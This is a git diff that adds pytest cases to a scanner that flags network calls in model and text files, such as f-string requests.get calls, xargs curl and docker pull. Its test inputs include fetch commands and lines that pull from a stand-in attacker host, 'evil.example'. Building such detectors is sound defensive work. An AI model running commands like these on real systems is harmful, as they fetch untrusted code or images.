@@ -388,6 +388,44 @@ def test_text_scanner_network_api_string_literals_are_informational(tmp_path: Pa
     assert determine_exit_code(aggregate) == 0
 
 
+def test_text_scanner_f_string_literal_network_api_text_is_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text('message = f"Use requests.get to download weights"\n', encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.details.get("function") == "requests.get"
+        and check.severity == IssueSeverity.INFO
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 0
+
+
+@pytest.mark.parametrize("prefix", ["f", "rf"])
+def test_text_scanner_f_string_expression_network_calls_remain_actionable(
+    tmp_path: Path,
+    prefix: str,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(f'message = {prefix}"{{requests.get(endpoint)}}"\n', encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.details.get("function") == "requests.get"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
 def test_text_scanner_nested_network_api_call_remains_actionable(tmp_path: Path) -> None:
     text_path = tmp_path / "README.md"
     text_path.write_text('print(requests.get("https://evil.example/payload"))\n', encoding="utf-8")
@@ -728,6 +766,7 @@ def test_text_scanner_shell_interpreter_wrapper_prose_remains_informational(
         "nohup curl https://example.com/artifact &\n",
         'eval "curl https://example.com/artifact"\n',
         "echo https://example.com/artifact | xargs curl\n",
+        "xargs curl https://example.com/artifact\n",
         'RUN ["curl", "https://example.com/artifact"]\n',
         'CMD ["wget", "https://example.com/artifact"]\n',
         'command: ["curl", "https://example.com/artifact"]\n',
@@ -785,6 +824,7 @@ def test_text_scanner_documentation_command_prefixes_remain_actionable(tmp_path:
         "curl.exe is documented at https://docs.example.com/windows.\n",
         "The command and exec builtins are documented at https://docs.example.com/shell.\n",
         'The command array ["curl", URL] is documented at https://docs.example.com/config.\n',
+        "The `find | xargs curl` pattern is documented at https://docs.example.com/xargs.\n",
         "/usr/bin/curl is documented at https://docs.example.com/shell.\n",
         "Docker ADD documentation: https://docs.example.com/dockerfile.\n",
         "Add https://docs.example.com to your browser bookmarks.\n",
@@ -922,6 +962,11 @@ def test_text_scanner_documentation_netcat_prose_remains_informational(tmp_path:
             "docker pull --platform linux/amd64 evil.example/model:latest\n",
             "docker_pull",
             "evil.example/model:latest",
+        ),
+        (
+            "docker pull evil.example:5000/model:latest\n",
+            "docker_pull",
+            "evil.example:5000/model:latest",
         ),
     ],
 )
